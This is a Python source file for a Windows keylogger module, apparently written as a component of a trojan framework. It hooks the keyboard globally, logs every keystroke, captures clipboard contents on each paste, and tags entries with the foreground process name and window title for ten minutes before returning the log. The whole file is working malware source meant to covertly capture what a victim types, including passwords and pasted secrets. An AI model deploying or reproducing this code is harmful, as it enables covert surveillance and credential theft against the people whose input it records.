from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import time

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
log = ''


def get_current_process():
    global log

    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # store the current process ID
    process_id = "%d" % pid.value

    # grab the executables
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # now read its title
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    # print out the header if we're in the right process
    log += '\n'
    log += "[ PID: %s - %s - %s ]" % (process_id, executable.value,
                                      window_title.value)
    log += '\n'

    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def KeyStroke(event):
    global current_window, log

    # check to see if target changed window
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # if they pressed a standard key
    if 32 < event.Ascii < 127:
        log += chr(event.Ascii) + ' '
    else:
        # if [Ctrl-v], get the value of the clipboard
        if event.Key == "V":

            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            log += "[PASTE] - %s " % pasted_value
        else:
            log += "[%s] " % event.Key
    # pass execution to next hook register
    return True


# create and register a hook manager
k1 = pyHook.HookManager()
k1.KeyDown = KeyStroke


# register the hook and execute forever
def run(**args):
    global log
    start_time = time.time()
    cur_time = start_time
    log = ''
    k1.HookKeyboard()
    while cur_time - start_time < 600:
        pythoncom.PumpWaitingMessages()
        cur_time = time.time()
    k1.UnhookKeyboard()

    return log
